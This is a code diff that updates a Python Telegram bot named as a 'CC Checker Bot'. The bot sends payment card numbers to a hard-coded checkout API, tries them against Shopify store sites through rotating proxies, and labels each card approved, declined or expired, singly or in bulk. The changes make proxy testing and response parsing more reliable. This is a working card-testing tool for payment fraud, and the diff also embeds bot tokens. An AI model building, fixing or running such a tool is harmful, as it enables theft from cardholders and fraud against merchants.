@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-COMPLETE Telegram CC Checker Bot
+COMPLETE Telegram CC Checker Bot - FIXED VERSION
 python-telegram-bot v21.7
-FULL IMPLEMENTATION
 """
 
 import os
@@ -18,7 +17,6 @@ import io
 import concurrent.futures
 from pathlib import Path
 from typing import Dict, List, Tuple, Optional, Any
-from urllib.parse import urlparse
 
 import requests
 from requests.adapters import HTTPAdapter
@@ -39,7 +37,7 @@ from telegram.constants import ParseMode
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8504531890:AAExJbBTih5wW2naWp87mBADAmK17efxFAw"
+BOT_TOKEN = "8504531890:AAG7DQHq-JH08llODepRct1rY7RQXpaxsU4"
 OWNER_ID = 6821529235
 API_BASE_URL = "http://140.99.254.73:3000/checkout"
 
@@ -105,8 +103,10 @@ def load_data():
     try:
         if SITES_FILE.exists():
             with open(SITES_FILE, 'r') as f:
-                sites = json.load(f)
-                if not isinstance(sites, list):
+                loaded = json.load(f)
+                if isinstance(loaded, list):
+                    sites = loaded
+                else:
                     sites = ["https://9marks.myshopify.com"]
         else:
             sites = ["https://9marks.myshopify.com"]
@@ -117,8 +117,11 @@ def load_data():
     try:
         if PROXIES_FILE.exists():
             with open(PROXIES_FILE, 'r') as f:
-                proxies = json.load(f)
-                if not isinstance(proxies, list):
+                loaded = json.load(f)
+                if isinstance(loaded, list):
+                    proxies = loaded
+                    logger.info(f"Loaded {len(proxies)} proxies from file")
+                else:
                     proxies = []
         else:
             proxies = []
@@ -303,23 +306,28 @@ def get_concurrent_limit(proxy_count: int) -> int:
     return 0
 
 def is_valid_response(response_text: str) -> bool:
-    """Check if API response is valid"""
+    """Check if API response is valid - FIXED VERSION"""
     if not response_text or not isinstance(response_text, str):
         return False
     
     if response_text.strip() == "":
         return False
     
+    # Check if it's a JSON response from the API
+    if response_text.startswith('{') and response_text.endswith('}'):
+        return True
+    
+    # Check for actual error messages
     invalid_responses = [
-        "error",
         "proxy error",
-        "timeout",
         "connection failed",
-        "invalid",
         "bad gateway",
         "gateway timeout",
         "connection refused",
-        "cannot connect"
+        "cannot connect",
+        "timeout",
+        "connect timeout",
+        "connection error"
     ]
     
     response_lower = response_text.lower()
@@ -330,13 +338,42 @@ def is_valid_response(response_text: str) -> bool:
     return True
 
 def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, str]:
-    """Process API response and determine status"""
+    """Process API response and determine status - FIXED VERSION"""
     if not api_response or not isinstance(api_response, str):
         return "NO RESPONSE", "ERROR", "$0.00"
     
     if not is_valid_response(api_response):
         return "INVALID RESPONSE", "ERROR", "$0.00"
     
+    # Try to parse as JSON
+    try:
+        if api_response.startswith('{') and api_response.endswith('}'):
+            data = json.loads(api_response)
+            message = data.get('Message', '')
+            status = data.get('Status', '')
+            gateway = data.get('Gateway', 'Unknown')
+            price_str = data.get('Price', '0.00')
+            
+            # Parse price from response
+            try:
+                price = float(price_str.replace('$', '').replace(',', ''))
+            except:
+                pass
+            
+            if status == 'APPROVED' or message == 'APPROVED':
+                return message, 'APPROVED', f"${price:.2f}"
+            elif 'DECLINED' in message.upper() or status == 'DECLINED':
+                return message, 'DECLINED', f"${price:.2f}"
+            elif 'EXPIRED' in message.upper():
+                return message, 'EXPIRED', f"${price:.2f}"
+            elif 'ERROR' in status.upper():
+                return message, 'ERROR', f"${price:.2f}"
+            else:
+                return message, 'DECLINED', f"${price:.2f}"
+    except:
+        pass
+    
+    # Fallback to text-based processing
     response_upper = api_response.upper()
     
     if 'THANK YOU' in response_upper:
@@ -367,7 +404,7 @@ def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, 
         return api_response, 'DECLINED', f"${price:.2f}"
 
 def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool, str, float]:
-    """Test proxy with actual API call"""
+    """Test proxy with actual API call - FIXED VERSION"""
     try:
         cc = TEST_CC
         api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
@@ -396,12 +433,18 @@ def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool
         )
         
         response_time = time.time() - start_time
-        response_text = response.text.strip() if response.status_code == 200 else f"HTTP {response.status_code}"
         
-        if response.status_code == 200 and is_valid_response(response_text):
-            return True, response_text, response_time
+        if response.status_code == 200:
+            response_text = response.text.strip()
+            logger.info(f"Proxy test response: {response_text[:100]}")
+            
+            # Proxy test SUCCESS if we get ANY valid response (not just "APPROVED")
+            if is_valid_response(response_text):
+                return True, response_text, response_time
+            else:
+                return False, response_text, response_time
         else:
-            return False, response_text, response_time
+            return False, f"HTTP {response.status_code}", response_time
         
     except requests.exceptions.ProxyError as e:
         logger.error(f"Proxy error: {e}")
@@ -472,12 +515,24 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
             result["response_time"] = response_time
             result["proxy_status"] = "✅"
             
-            price_match = re.search(r'[\$£€](\d+\.?\d*)', site_url)
-            if price_match:
-                try:
-                    result["price"] = float(price_match.group(1))
-                except:
-                    result["price"] = 0.00
+            # Try to parse price from JSON response
+            try:
+                if response_text.startswith('{') and response_text.endswith('}'):
+                    data = json.loads(response_text)
+                    price_str = data.get('Price', '0.00')
+                    if price_str:
+                        result["price"] = float(price_str.replace('$', '').replace(',', ''))
+            except:
+                pass
+            
+            # Also try to get price from site URL
+            if result["price"] == 0.00:
+                price_match = re.search(r'[\$£€](\d+\.?\d*)', site_url)
+                if price_match:
+                    try:
+                        result["price"] = float(price_match.group(1))
+                    except:
+                        result["price"] = 0.00
             
             processed_response, status, gateway = process_response(response_text, result["price"])
             result["response"] = processed_response[:100]
@@ -645,8 +700,11 @@ Reply to a message with CC
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /chk command"""
+    """Handle /chk command - FIXED VERSION"""
     user = update.effective_user
+    
+    # Debug: Show proxies count
+    logger.info(f"chk_command: Checking proxies list. Count: {len(proxies)}")
     
     if not proxies:
         await update.message.reply_text(
@@ -679,8 +737,13 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     processing_msg = await update.message.reply_text("🔄 Checking card with proxy...")
     
+    # Debug: Show proxy being used
+    logger.info(f"chk_command: Using proxy from list of {len(proxies)} proxies")
+    
     proxy_dict = random.choice(proxies)
     site = random.choice(sites)
+    
+    logger.info(f"chk_command: Checking with proxy: {proxy_dict['host']}:{proxy_dict['port']}")
     
     result = check_site(site, cc, proxy_dict)
     
@@ -698,6 +761,9 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /mass command"""
+    # Debug
+    logger.info(f"mass_command: Proxies count: {len(proxies)}")
+    
     if not proxies:
         await update.message.reply_text(
             "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
@@ -724,7 +790,7 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
 
 async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /addproxy command"""
+    """Handle /addproxy command - FIXED VERSION"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Owner only command.")
         return
@@ -735,6 +801,7 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     proxy_str = ' '.join(context.args)
     
+    # Check if proxy already exists
     for proxy in proxies:
         if proxy["string"] == proxy_str:
             await update.message.reply_text("⚠️ Proxy already exists.")
@@ -754,9 +821,15 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     site = sites[0] if sites else "https://9marks.myshopify.com"
     success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
     
-    if success:
+    # FIX: Consider ANY valid API response as success (not just "APPROVED")
+    if success or (is_valid_response(response_text) and not "Proxy Error" in response_text):
+        # Add proxy to list
         proxies.append(proxy_dict)
         save_data("proxies")
+        
+        # Debug
+        logger.info(f"addproxy_command: Added proxy. Total proxies now: {len(proxies)}")
+        logger.info(f"addproxy_command: Saved to {PROXIES_FILE}")
         
         concurrent_limit = get_concurrent_limit(len(proxies))
         
@@ -784,6 +857,8 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /listproxies command"""
+    logger.info(f"listproxies_command: Proxies count: {len(proxies)}")
+    
     if not proxies:
         await update.message.reply_text("❌ No proxies available.")
         return
@@ -812,10 +887,12 @@ async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYP
     proxies.clear()
     save_data("proxies")
     
+    logger.info(f"clearproxies_command: Cleared {count} proxies")
+    
     await update.message.reply_text(f"✅ Cleared {count} proxies.")
 
 async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /testproxy command"""
+    """Handle /testproxy command - FIXED VERSION"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Owner only command.")
         return
@@ -836,16 +913,54 @@ async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     site = sites[0] if sites else "https://9marks.myshopify.com"
     success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
     
-    if success:
-        await test_msg.delete()
-        await update.message.reply_text(
-            f"✅ <b>Proxy Test Successful!</b>\n\n"
-            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
-            f"<b>User:</b> {proxy_dict['username']}\n"
-            f"<b>Status:</b> Working with API ✅\n\n"
-            "Use /addproxy to add this proxy to your list.",
-            parse_mode=ParseMode.HTML
-        )
+    # FIX: Show the actual API response and consider it successful if we got ANY response
+    if success or (is_valid_response(response_text) and not "Proxy Error" in response_text):
+        # Try to parse JSON response
+        try:
+            if response_text.startswith('{') and response_text.endswith('}'):
+                data = json.loads(response_text)
+                status = data.get('Status', 'Unknown')
+                message = data.get('Message', 'Unknown')
+                gateway = data.get('Gateway', 'Unknown')
+                price = data.get('Price', '0.00')
+                
+                await test_msg.delete()
+                await update.message.reply_text(
+                    f"✅ <b>Proxy Test Successful!</b>\n\n"
+                    f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
+                    f"<b>User:</b> {proxy_dict['username']}\n"
+                    f"<b>Status:</b> Got API Response ✅\n\n"
+                    f"<b>API Response:</b>\n"
+                    f"• Status: {status}\n"
+                    f"• Message: {message}\n"
+                    f"• Gateway: {gateway}\n"
+                    f"• Price: {price}\n"
+                    f"• Response Time: {response_time:.2f}s\n\n"
+                    "Use /addproxy to add this proxy to your list.",
+                    parse_mode=ParseMode.HTML
+                )
+            else:
+                await test_msg.delete()
+                await update.message.reply_text(
+                    f"✅ <b>Proxy Test Successful!</b>\n\n"
+                    f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
+                    f"<b>User:</b> {proxy_dict['username']}\n"
+                    f"<b>Status:</b> Got Response ✅\n\n"
+                    f"<b>Response:</b> {response_text[:200]}\n"
+                    f"<b>Response Time:</b> {response_time:.2f}s\n\n"
+                    "Use /addproxy to add this proxy to your list.",
+                    parse_mode=ParseMode.HTML
+                )
+        except:
+            await test_msg.delete()
+            await update.message.reply_text(
+                f"✅ <b>Proxy Test Successful!</b>\n\n"
+                f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
+                f"<b>User:</b> {proxy_dict['username']}\n"
+                f"<b>Status:</b> Working with API ✅\n\n"
+                "Use /addproxy to add this proxy to your list.",
+                parse_mode=ParseMode.HTML
+            )
     else:
         await test_msg.delete()
         await update.message.reply_text(
